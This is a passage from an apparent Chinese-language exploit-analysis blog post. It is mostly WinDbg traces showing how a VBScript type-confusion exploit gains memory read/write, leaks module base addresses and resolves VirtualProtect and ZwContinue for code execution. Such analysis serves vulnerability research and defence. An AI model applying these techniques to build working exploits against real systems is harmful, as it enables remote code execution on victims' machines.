00000002</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(poi(esp+c)+8)  //setprop_a_1  (&#x4FEE;&#x6539;&#x524D;)</span><br><span class="line">01f25328  671e0009 01f267ec 01f267e8 671e4211</span><br><span class="line">01f25338  00000000 00000000 1c17d9ab 08020745</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd poi(poi(0062f9f0 +8)+34)</span><br><span class="line">01f19d00  01f1c084 01f1c0cc 01f1c104 00000000</span><br><span class="line">01f19d10  00000000 00000000 00000000 00000000</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">0:005&gt; du 01f1c104+30 //setprop_a_1.mem.name</span><br><span class="line">01f1c134  &quot;mem&quot;</span><br><span class="line"></span><br><span class="line">0:005&gt; dd 01f1c104  //setprop_a_1.mem</span><br><span class="line">01f1c104  0000200c 00000000 00499d24 00000000</span><br><span class="line">01f1c114  00000000 00000000 0000822f 00000006</span><br><span class="line">01f1c124  00000000 00000000 00000003 000008ce</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 00499d24 </span><br><span class="line">00499d24  08800001 00000001 00000000 00000000</span><br><span class="line">00499d34  7fffffff 00000000 671e0000 2a298ca9</span><br><span class="line">00499d44  88000000 00000016 006c0063 00730061</span><br><span class="line">    </span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=672a185c ebx=027bcfd8 ecx=672fa9d8 edx=027bcf50 esi=01dd2494 edi=00000001</span><br><span class="line">eip=672bc206 esp=027bce6c ebp=027bce7c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">672bc206 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(esp+c)   //&#x5C06;a&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;rw_var&#x6240;&#x6307;&#x5185;&#x5B58;</span><br><span class="line">005be888  00000003 00050809 00186c6c 00000bd6</span><br><span class="line">0:005&gt; dd 00186c6c</span><br><span class="line">00186c6c  00000000 00000000 00000001 00000080 //&#x6CE8;&#x610F;&#x6B64;&#x65F6;&#x5199;&#x5165;&#x5185;&#x5B58;&#x7684;a&#x7C7B;&#x578B;&#x4E3A;01  &#x5373;VT_NULL</span><br><span class="line">00186c7c  005bea60 04000004 00200000 20634b05</span><br><span class="line">00186c8c  88000077 0018a3e8 00000000 00000000</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 005bea60</span><br><span class="line">005bea60  672a4934 00000001 01dc8598 01dd1fd0 //&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6B64;&#x5904;&#x6570;&#x636E;&#x4E0E;a&#x7684;&#x6570;&#x636E;&#x662F;&#x76F8;&#x540C;&#x7684;</span><br><span class="line">005bea70  01dd477c 00000000 01dc8598 01dc81e0</span><br><span class="line">005bea80  153644fd 0800c4f6 672a4934 00000002</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=672a185c ebx=027bcfd8 ecx=672fa9d8 edx=027bcf50 esi=01dd2494 edi=00000001</span><br><span class="line">eip=672bc206 esp=027bce6c ebp=027bce7c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">672bc206 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(esp+c)  //&#x6267;&#x884C;&#x5B8C; setprop_a_1.mem(rw_var) = 3 &#x540E;&#x7684;rw_var&#x6240;&#x6307;&#x5185;&#x5B58;</span><br><span class="line">005be898  00000003 00050809 00186c6c 00000bd6</span><br><span class="line">005be8a8  027b0000 005be8e8 027b0001 01dc8628</span><br><span class="line"></span><br><span class="line">0:005&gt; dd 00186c6c</span><br><span class="line">00186c6c  00000002 77ba2dd6 01dd0003 00160548  //&#x6CE8;&#x610F;&#x6B64;&#x65F6;&#x5DF2;&#x7ECF;&#x5C06;rw_var&#x6240;&#x6307;&#x5185;&#x5B58;&#x4E2D;a&#x7684;&#x7C7B;&#x578B;&#x4FEE;&#x6539;&#x4E3A;03 &#x5373;VT_I4&#xFF08;&#x957F;&#x6574;&#x578B;&#xFF08;Long Interger&#xFF09;&#xFF09;</span><br><span class="line">00186c7c  005bea60 04000004 00200000 20634b05</span><br><span class="line">00186c8c  88000077 00186d80 00000000 00000000</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 005bea60</span><br><span class="line">005bea60  672a4934 00000001 01dc8598 01dd1fd0 //a&#x4E2D;&#x6570;&#x636E;</span><br><span class="line">005bea70  01dd477c 00000000 01dc8598 01dc81e0</span><br><span class="line">005bea80  153644fd 0800c4f6 672a4934 00000002</span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=672a185c ebx=027bcfd8 ecx=672fa9d8 edx=027bcf50 esi=01dd2494 edi=00000001</span><br><span class="line">eip=672bc206 esp=027bce6c ebp=027bce7c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">672bc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)                             //&#x6B64;&#x65F6;&#x8FD4;&#x56DE;&#x81F3;&#x6307;&#x5411;&#x7684;&#x662F;rw_var+8&#x5904;&#x7684;&#x5185;&#x5B58;</span><br><span class="line">01fc7c40  01fb0003 006ac190 008be8b8 ba0000ba</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=672a185c ebx=027bd460 ecx=672fa9d8 edx=027bd3d8 esi=01dd2494 edi=00000001</span><br><span class="line">eip=672bc206 esp=027bd2f4 ebp=027bd304 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">672bc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01fc7c40  01fb0003 006ac190 008be8b8 ba0000ba    //&#x540C;&#x6837;&#x7684;&#x6B64;&#x65F6;leakaddr&#x6307;&#x5411;&#x7684;&#x4E5F;&#x662F;rw_var+8&#x5904;&#x7684;&#x5185;&#x5B58;  &#xFF08;&#x53EF;&#x7406;&#x89E3;&#x4E3A;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#xFF09;</span><br><span class="line">    </span><br><span class="line">//&#x770B;&#x5230;&#x719F;&#x6089;&#x7684;&#x7A7A;&#x58F3;&#x51FD;&#x6570;&#x8D4B;&#x503C;&#xFF0C;&#x90A3;&#x4E48;&#x4FBF;&#x77E5;&#x9053;&#x8FD9;&#x91CC;&#x662F;&#x83B7;&#x53D6;CScriptEntryPoint&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5173;&#x4E8E;&#x83B7;&#x53D6;&#x7684;&#x7EC6;&#x8282;&#xFF0C;&#x540E;&#x6587;&#x4F1A;&#x63D0;&#x5230;</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260cb54 ecx=67c5a9d8 edx=0260cacc esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c9e8 ebp=0260c9f8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01fc7c00  01fb0003 006ac190 008be8b8 ba0000ba  //&#x8FDB;&#x5165;GetUint32&#x51FD;&#x6570;&#xFF0C;&#x770B;&#x5230;&#x53C2;&#x6570;&#x5373;&#x4E3A;&#x6211;&#x4EEC;&#x7684;leakaddr</span><br><span class="line">    </span><br><span class="line">0:005&gt; dd 008be8b8</span><br><span class="line">008be8b8  67c04934 00000001 008be2e0 01fc3c40</span><br><span class="line">008be8c8  01fc6df4 00000000 008be2e0 008bfd20</span><br><span class="line">008be8d8  1e702d15 0800cdcc 67c04934 00000001</span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260cb54 ecx=67c5a9d8 edx=0260cacc esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c9e8 ebp=0260c9f8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01fc7c00  00000003 00000000 0069b754 00000000   //&#x6B64;&#x65F6;&#x7684;rw_var&#x7ED3;&#x6784;</span><br><span class="line"></span><br><span class="line">0:005&gt; dd 0069b754 </span><br><span class="line">0069b754  00000002 77ba2dd6 01fb0003 006ac190 //rw_var&#x771F;&#x6B63;&#x6570;&#x636E;</span><br><span class="line">0069b764  008be8b8 ba0000ba 00000000 02c5d59e</span><br><span class="line">0069b774  8800000a 00000000 00614640 00646cd8</span><br><span class="line">0069b784  006ab098 00000000 00000000 00000000</span><br><span class="line">    </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260cb54 ecx=67c5a9d8 edx=0260cacc esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c9e8 ebp=0260c9f8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01fc7c00  00000003 00000000 0069b754 00000000 //&#x4FEE;&#x6539;&#x4E86;&#x8BFB;&#x53D6;&#x4F4D;&#x7F6E;&#x548C; &#x7C7B;&#x578B;&#x7684;rw_var&#x4E3A;8  string</span><br><span class="line">0:005&gt; dd 0069b754 </span><br><span class="line">0069b754  01fb0002 006ac190 008b0008 ba0000ba</span><br><span class="line">0069b764  008be8bc ba0000ba 00000000 02c5d59e</span><br><span class="line">0069b774  8800000a 00000000 00614640 00646cd8</span><br><span class="line"> </span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260c67c ecx=67c5a9d8 edx=0260c5f4 esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c510 ebp=0260c520 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01fc7bb0  02600000 01fc7c30 01fb0003 006ac190   //Read_Memory &#x6267;&#x884C;&#x524D;&#x7684;&#x8FD4;&#x56DE;&#x503C;</span><br><span class="line">01fc7bc0  02600000 01fc7c30 01fb0003 006ac190</span><br><span class="line">01fc7bd0  0260c7a4 01fc7bf0 008b0008 ba0000ba</span><br><span class="line"></span><br><span class="line">//Read_Memory = LenB(mem(rw_var + 8))</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260cb54 ecx=67c5a9d8 edx=0260cacc esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c9e8 ebp=0260c9f8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi</span><br><span class="line"></span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01fc7bb0  00000003 00000000 67c04934 00000000</span><br><span class="line">0:005&gt; dd 67c04934</span><br><span class="line">67c04934  67c061bd 67c0494d 67c0ccc6 67c0663a</span><br><span class="line">67c04944  67c04f20 90909090 0449ff90 0ddd840f</span><br><span class="line">67c04954  90c30000 90909090 8b55ff8b ffff6aec</span><br><span class="line">67c04964  15ff0875 67c01090 c25d5959 90900004</span><br><span class="line">    </span><br><span class="line">0:005&gt; ln 67c04934   //&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6B64;&#x65F6;&#x6211;&#x4EEC;&#x90FD;&#x51FA;&#x4E86;CScriptEntryPoint&#x7684;&#x865A;&#x8868;&#x5730;&#x5740;</span><br><span class="line">Browse module</span><br><span class="line">Set bu breakpoint</span><br><span class="line"></span><br><span class="line">(67c04934)   vbscript!CScriptEntryPoint::`vftable&apos;   |  (67c1ab54)   vbscript!CEntryPointDispatch::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    vbscript!CScriptEntryPoint::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">    </span><br><span class="line">0:005&gt; g  </span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260cb54 ecx=67c5a9d8 edx=0260cacc esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c9e8 ebp=0260c9f8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi  //rw_var</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260cb54 ecx=67c5a9d8 edx=0260cacc esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c9e8 ebp=0260c9f8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01fc7c00  00000003 00000000 67c04934 00000000  //getUint32&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x4E0A;&#x9762;&#x5F97;&#x5230;&#x7684;&#x865A;&#x8868;&#x5730;&#x5740;</span><br><span class="line">    </span><br><span class="line">//03 &#x957F;&#x6574;&#x578B;&#xFF08;Long Interger&#xFF09;</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c0185c ebx=0260c910 ecx=67c5a9d8 edx=0260c888 esi=01fc4114 edi=00000001</span><br><span class="line">eip=67c1c206 esp=0260c7a4 ebp=0260c7b4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c1c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+C)</span><br><span class="line">0055e840  00000003 00000000 67c00000 00000000 //&#x8FD4;&#x56DE;&#x7684;&#x5F97;&#x5230;&#x7684;Vbscript&#x6A21;&#x5757;&#x57FA;&#x5730;&#x5740;&#x7ED3;&#x6784;  &#x540C;&#x6837;&#x4E3A;VARIANT&#x7ED3;&#x6784; </span><br><span class="line">0055e850  024b0000 0055e940 00000000 00000004</span><br><span class="line">0055e860  024bd28c 0055e940 0211efe0 0055fd90</span><br><span class="line">0:005&gt; db 67c00000 </span><br><span class="line">67c00000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............</span><br><span class="line">67c00010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......</span><br><span class="line">67c00020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">67c00030  00 00 00 00 00 00 00 00-00 00 00 00 f0 00 00 00  ................</span><br><span class="line">67c00040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th</span><br><span class="line">67c00050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno</span><br><span class="line">67c00060  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS </span><br><span class="line">67c00070  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......</span><br></pre></td></tr></table></figure>
+
+<p>//&#x770B;&#x5230;MZ,&#x786E;&#x5B9A;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x6A21;&#x5757;&#x57FA;&#x5730;&#x5740;&#x800C;&#x6211;&#x4EEC;&#x7684;CScriptEntryPoint&#x5B9E;&#x5728;Vbscript.dll&#x6A21;&#x5757;&#x4E2D;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x83B7;&#x5F97;&#x4E86;&#x540E;&#x8005;&#x7684;&#x57FA;&#x5730;&#x5740;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67f7185c ebx=025dcf18 ecx=67fca9d8 edx=025dce90 esi=01bc8908 edi=00000001</span><br><span class="line">eip=67f8c206 esp=025dcdac ebp=025dcdbc iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67f8c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+C)</span><br><span class="line">01bce470  01bb0003 00000000 76e70000 00000000   //76e70000&#x4E3A;msvcrt_mod_base</span><br><span class="line">01bce480  025d0000 01bce570 00000000 00000000</span><br><span class="line">    </span><br><span class="line">0:005&gt; db 76e70000</span><br><span class="line">76e70000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............</span><br><span class="line">76e70010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......</span><br><span class="line">76e70020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">76e70030  00 00 00 00 00 00 00 00-00 00 00 00 e0 00 00 00  ................</span><br><span class="line">76e70040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=680b185c ebx=0245d1c8 ecx=6810a9d8 edx=0245d140 esi=01bc87f8 edi=00000001</span><br><span class="line">eip=680cc206 esp=0245d05c ebp=0245d06c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">680cc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01bce320  00000003 00000000 75f20000 00000000  //75f20000&#x4E3A;KernelBase.dll&#x57FA;&#x5730;&#x5740;</span><br><span class="line">01bce330  02450000 01bce420 00000000 00000000</span><br><span class="line">    </span><br><span class="line">0:005&gt; db 75f20000 </span><br><span class="line">75f20000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............</span><br><span class="line">75f20010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......</span><br><span class="line">75f20020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">75f20030  00 00 00 00 00 00 00 00-00 00 00 00 e0 00 00 00  ................</span><br><span class="line">75f20040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th</span><br><span class="line">75f20050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno</span><br><span class="line"></span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=680b185c ebx=0245d1c8 ecx=6810a9d8 edx=0245d140 esi=01bc87f8 edi=00000001</span><br><span class="line">eip=680cc206 esp=0245d05c ebp=0245d06c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">680cc206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c)</span><br><span class="line">01bce320  00000003 00000000 77b50000 00000000  //77b50000&#x4E3A;ntdll&#x6A21;&#x5757;&#x57FA;&#x5730;&#x5740;</span><br><span class="line"></span><br><span class="line">0:005&gt; db 77b50000</span><br><span class="line">77b50000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............</span><br><span class="line">77b50010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......</span><br><span class="line">77b50020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">77b50030  00 00 00 00 00 00 00 00-00 00 00 00 d0 00 00 00  ................</span><br><span class="line">77b50040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th</span><br><span class="line">77b50050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno</span><br><span class="line">77b50060  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS</span><br></pre></td></tr></table></figure>
+
+<p>&#x540E;&#x9762;&#x901A;&#x8FC7;Vbscript.dll&#x57FA;&#x5730;&#x5740;&#x83B7;&#x5F97;msvcrt.dll&#x3001;kernleBase.dll&#x3001;ntdll.dll&#x6A21;&#x5757;&#x57FA;&#x5730;&#x5740;&#xFF08;&#x901A;&#x8FC7;&#x5BFC;&#x5165;&#x8868;&#x904D;&#x5386;&#xFF09;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67c7185c ebx=026fd148 ecx=67cca9d8 edx=026fd0c0 esi=01ec864c edi=00000001</span><br><span class="line">eip=67c8c206 esp=026fcfdc ebp=026fcfec iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67c8c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+C)</span><br><span class="line">01ecddc8  00000003 00000000 75f422bd 00000000</span><br><span class="line"></span><br><span class="line">0:005&gt; ln 75f422bd    //&#x6B64;&#x5730;&#x5740;&#x4E3A;VirtualProtect&#x51FD;&#x6570;&#x5730;&#x5740;</span><br><span class="line">Browse module</span><br><span class="line">Set bu breakpoint</span><br><span class="line"></span><br><span class="line">(75f422bd)   KERNELBASE!VirtualProtect   |  (75f422de)   KERNELBASE!VirtualProtectEx</span><br><span class="line">Exact matches:</span><br><span class="line">    KERNELBASE!VirtualProtect (&lt;no parameter info&gt;)</span><br><span class="line">        </span><br><span class="line">0:005&gt; u 75f422bd</span><br><span class="line">KERNELBASE!VirtualProtect:</span><br><span class="line">75f422bd 8bff            mov     edi,edi</span><br><span class="line">75f422bf 55              push    ebp</span><br><span class="line">75f422c0 8bec            mov     ebp,esp</span><br><span class="line">75f422c2 ff7514          push    dword ptr [ebp+14h]</span><br><span class="line">75f422c5 ff7510          push    dword ptr [ebp+10h]</span><br><span class="line">75f422c8 ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">75f422cb ff7508          push    dword ptr [ebp+8]</span><br><span class="line">75f422ce 6aff            push    0FFFFFFFFh</span><br></pre></td></tr></table></figure>
+
+<p>&#x83B7;&#x53D6;KernelBase.dll&#x7684;VirtualProtect&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF08;&#x8BBF;&#x95EE;&#x5BFC;&#x51FA;&#x8868;&#x83B7;&#x53D6;&#xFF09;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=67f7185c ebx=025dcfb0 ecx=67fca9d8 edx=025dcf28 esi=01ec875c edi=00000001</span><br><span class="line">eip=67f8c206 esp=025dce44 ebp=025dce54 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">67f8c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+C)</span><br><span class="line">01ecded8  00000003 00000000 77b95568 00000000</span><br><span class="line">01ecdee8  025d0000 01ecdfd8 00000000 00000000</span><br><span class="line">01ecdef8  025dd2a4 01ecdfd8 01ecfef0 00000000</span><br><span class="line">01ecdf08  0000400c 00000000 01ecf680 00000000</span><br><span class="line">01ecdf18  0000400c 00000000 01ecf640 00000000</span><br><span class="line">01ecdf28  0000400c 00000000 01ecf5f8 00000000</span><br><span class="line">01ecdf38  0000400c 00000000 01ecf5b0 00000000</span><br><span class="line">01ecdf48  0000400c 00000000 01ecf570 00000000</span><br><span class="line">0:005&gt; ln 77b95568       //&#x6B64;&#x5730;&#x5740;&#x4E3A;ZwContinue&#x51FD;&#x6570;&#x5730;&#x5740;</span><br><span class="line">Browse module</span><br><span class="line">Set bu breakpoint</span><br><span class="line"></span><br><span class="line">(77b95568)   ntdll!ZwContinue   |  (77b95578)   ntdll!NtCreateDebugObject</span><br><span class="line">Exact matches:</span><br><span class="line">    ntdll!NtContinue (&lt;no parameter info&gt;)</span><br><span class="line">    ntdll!ZwContinue (&lt;no parameter info&gt;)</span><br><span class="line">0:005&gt; u 77b95568</span><br><span class="line">ntdll!ZwContinue:</span><br><span class="line">77b95568 b83c000000      mov     eax,3Ch</span><br><span class="line">77b9556d ba0003fe7f      mov     edx,offset SharedUserData!SystemCallStub (7ffe0300)</span><br><span class="line">77b95572 ff12            call    dword ptr [edx]</span><br><span class="line">77b95574 c20800          ret     8</span><br><span class="line">77b95577 90              nop</span><br><span class="line">ntdll!NtCreateDebugObject:</span><br><span class="line">77b95578 b83d000000      mov     eax,3Dh</span><br><span class="line">77b9557d ba0003fe7f      mov     edx,offset 